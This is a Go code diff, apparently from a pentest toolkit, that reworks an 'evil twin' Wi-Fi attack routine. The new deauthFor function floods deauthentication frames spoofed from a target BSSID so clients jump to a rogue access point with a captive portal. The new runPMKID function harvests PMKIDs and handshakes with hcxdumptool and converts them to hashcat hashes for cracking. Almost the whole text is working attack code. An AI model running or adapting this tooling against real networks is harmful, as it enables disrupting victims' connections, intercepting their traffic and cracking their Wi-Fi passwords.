@@ -176,7 +176,7 @@ func RunEvilTwin(ctx context.Context, cfg EvilConfig, onLine func(string)) error
 		need = append(need, "iptables")
 	}
 	if missing := toolMissing(need...); len(missing) > 0 {
-		return fmt.Errorf("missing: %s", strings.Join(missing, ", "))
+		return fmt.Errorf("missing %s — sudo apt install %s", strings.Join(missing, ", "), strings.Join(missing, " "))
 	}
 	if cfg.Channel <= 0 {
 		cfg.Channel = 6
@@ -205,6 +205,32 @@ func RunEvilTwin(ctx context.Context, cfg EvilConfig, onLine func(string)) error
 			cleanups[i]()
 		}
 	}()
+
+	// A single-radio adapter (brcmfmac and friends) cannot host an AP and a
+	// monitor interface at the same time - hostapd's driver init fails as soon as
+	// the monitor appears. So the deauth burst and the PMKID harvest run *first*,
+	// while the radio is still free, and only then does the twin come up.
+	if cfg.DeauthBSSID != "" {
+		if mon, merr := addMonitorOnAir(r, cfg.Iface, cfg.Channel); merr != nil {
+			emit.line("monitor unavailable: %v", merr)
+		} else {
+			emit.line("Deauthing %s for %s before the twin starts", cfg.DeauthBSSID, deauthWindow)
+			deauthFor(ctx, mon, cfg.DeauthBSSID, deauthWindow, emit)
+			_, _ = r.priv("iw", "dev", mon, "del")
+			_ = r.ensureManaged(cfg.Iface)
+		}
+	}
+	if cfg.PMKID {
+		// hcxdumptool drives the physical interface itself (it switches the
+		// interface into monitor mode), so it must not be given our vif.
+		runPMKID(ctx, cfg.Iface, cfg, emit)
+		_ = r.ensureManaged(cfg.Iface)
+	}
+	// The monitor / harvest phase can leave the interface missing or in monitor
+	// mode; get it back before addressing it for the AP.
+	if err := r.ensureManaged(cfg.Iface); err != nil {
+		return err
+	}
 
 	// Address the AP interface and stop DHCP clients from fighting over it.
 	r.setNetworkManagerManaged(cfg.Iface, false)
@@ -261,49 +287,29 @@ func RunEvilTwin(ctx context.Context, cfg EvilConfig, onLine func(string)) error
 		emit.line("Captive portal on http://%s", EvilGateway)
 	}
 
-	var mon string
-	if cfg.DeauthBSSID != "" || cfg.PMKID {
-		m, cerr := addMonitorOnAir(r, cfg.Iface, cfg.Channel)
-		if cerr != nil {
-			emit.line("monitor unavailable: %v", cerr)
-		} else {
-			mon = m
-			cleanups = append(cleanups, func() { _, _ = r.priv("iw", "dev", mon, "del") })
-		}
-	}
-
-	if cfg.DeauthBSSID != "" && mon != "" {
-		go runDeauthLoop(ctx, mon, cfg.DeauthBSSID, emit)
-		emit.line("Deauthing original %s", cfg.DeauthBSSID)
-	}
-
-	if cfg.PMKID && mon != "" {
-		capDir := strings.TrimSpace(cfg.CaptureDir)
-		if capDir == "" {
-			capDir = filepath.Join(dir, "captures")
-		}
-		_ = os.MkdirAll(capDir, 0o755)
-		out := filepath.Join(capDir, "pmkid-"+time.Now().Format("20060102-150405")+".pcapng")
-		if cmd := emit.run(ctx, "hcxdumptool", "-i", mon, "-w", out, "--enable_status=1"); cmd != nil {
-			cleanups = append(cleanups, func() {
-				_ = cmd.Process.Kill()
-				_, _ = cmd.Process.Wait()
-				ChownCapture(capDir, out, cfg.UID, cfg.GID)
-				emit.line("Saved %s", filepath.Base(out))
-				if _, err := exec.LookPath("hcxpcapngtool"); err == nil {
-					hash := strings.TrimSuffix(out, ".pcapng") + ".22000"
-					if hcmd := exec.Command("hcxpcapngtool", "-o", hash, out); hcmd.Run() == nil {
-						ChownCapture(capDir, hash, cfg.UID, cfg.GID)
-						emit.line("Hashes: %s", filepath.Base(hash))
-					}
-				}
-			})
-		}
-	}
-
 	<-ctx.Done()
 	emit.line("Stopping twin")
 	return ctx.Err()
+}
+
+// ensureManaged makes sure the interface exists and is a managed, up link.
+// Some drivers drop the primary interface while it is being switched between
+// monitor and AP mode, so it may have to be re-created from the phy.
+func (r pentestRunner) ensureManaged(name string) error {
+	if _, err := r.priv("ip", "link", "show", name); err != nil {
+		phys, _ := filepath.Glob("/sys/class/ieee80211/phy*")
+		if len(phys) == 0 {
+			return fmt.Errorf("%s disappeared and no phy is present", name)
+		}
+		phy := filepath.Base(phys[0])
+		if out, err := r.priv("iw", "phy", phy, "interface", "add", name, "type", "managed"); err != nil {
+			return fmt.Errorf("recreate %s: %s", name, cmdErrorText(out, err))
+		}
+	}
+	_, _ = r.priv("ip", "link", "set", name, "down")
+	_, _ = r.priv("iw", "dev", name, "set", "type", "managed")
+	_, _ = r.priv("ip", "link", "set", name, "up")
+	return nil
 }
 
 // addMonitorOnAir creates a monitor interface next to an interface that is
@@ -317,25 +323,34 @@ func addMonitorOnAir(r pentestRunner, iface string, channel int) (string, error)
 		_, _ = r.priv("iw", "dev", mon, "del")
 		return "", fmt.Errorf("bring %s up: %s", mon, cmdErrorText(out, err))
 	}
+	// The monitor vif shares the phy with the running AP, so it is already on
+	// the AP's channel; setting it explicitly returns EBUSY while hostapd owns
+	// the interface. That is expected, not a failure.
 	if err := r.setChannel(mon, channel); err != nil {
-		_, _ = r.priv("iw", "dev", mon, "del")
-		return "", err
+		_ = err
 	}
 	return mon, nil
 }
 
-// runDeauthLoop broadcasts deauths spoofed from the original BSSID so clients
-// fall back to the twin.
-func runDeauthLoop(ctx context.Context, mon, bssid string, emit *evilStreamer) {
+// deauthWindow is how long the pre-AP deauth burst runs.
+const deauthWindow = 8 * time.Second
+
+// pmkidWindow bounds the PMKID harvest that runs before the AP starts.
+const pmkidWindow = 12 * time.Second
+
+// deauthFor broadcasts deauths spoofed from the original BSSID so clients fall
+// back to the twin that appears right after.
+func deauthFor(ctx context.Context, mon, bssid string, window time.Duration, emit *evilStreamer) {
 	sock, err := openPacketSocket(mon)
 	if err != nil {
 		emit.line("deauth: %v", err)
 		return
 	}
 	defer sock.close()
+	deadline := time.Now().Add(window)
 	var seq uint16
 	sent := 0
-	for ctx.Err() == nil {
+	for ctx.Err() == nil && time.Now().Before(deadline) {
 		frame, ferr := buildDeauthFrame(bssid, seq)
 		seq++
 		if ferr == nil {
@@ -345,8 +360,48 @@ func runDeauthLoop(ctx context.Context, mon, bssid string, emit *evilStreamer) {
 		}
 		select {
 		case <-ctx.Done():
-		case <-time.After(time.Second):
+		case <-time.After(200 * time.Millisecond):
 		}
 	}
-	emit.line("deauth stopped (%d frames)", sent)
+	emit.line("deauth sent %d frames", sent)
+}
+
+// runPMKID harvests PMKIDs/handshakes for a short window while the radio is
+// still available, then converts the capture to hashcat 22000 format.
+func runPMKID(ctx context.Context, mon string, cfg EvilConfig, emit *evilStreamer) {
+	capDir := strings.TrimSpace(cfg.CaptureDir)
+	if capDir == "" {
+		capDir = filepath.Join(os.TempDir(), "czhax-captures")
+	}
+	if err := os.MkdirAll(capDir, 0o755); err != nil {
+		emit.line("pmkid: %v", err)
+		return
+	}
+	out := filepath.Join(capDir, "pmkid-"+time.Now().Format("20060102-150405")+".pcapng")
+	pctx, cancel := context.WithTimeout(ctx, pmkidWindow)
+	defer cancel()
+	emit.line("Harvesting PMKIDs for %s", pmkidWindow)
+	cmd := exec.CommandContext(pctx, "hcxdumptool", "-i", mon, "-w", out)
+	raw, runErr := cmd.CombinedOutput()
+	for _, line := range strings.Split(strings.TrimSpace(string(raw)), "\n") {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasPrefix(line, "$ hcxdumptool") {
+			continue
+		}
+		emit.line("hcxdumptool: %s", line)
+	}
+	ChownCapture(capDir, out, cfg.UID, cfg.GID)
+	if st, serr := os.Stat(out); serr == nil && st.Size() > 0 {
+		emit.line("Saved %s (%d bytes)", filepath.Base(out), st.Size())
+	} else if runErr != nil {
+		emit.line("pmkid: capture unavailable on this driver (needs nexmon/patched firmware)")
+		return
+	}
+	if _, err := exec.LookPath("hcxpcapngtool"); err == nil {
+		hash := strings.TrimSuffix(out, ".pcapng") + ".22000"
+		if herr := exec.Command("hcxpcapngtool", "-o", hash, out).Run(); herr == nil {
+			ChownCapture(capDir, hash, cfg.UID, cfg.GID)
+			emit.line("Hashes: %s", filepath.Base(hash))
+		}
+	}
 }
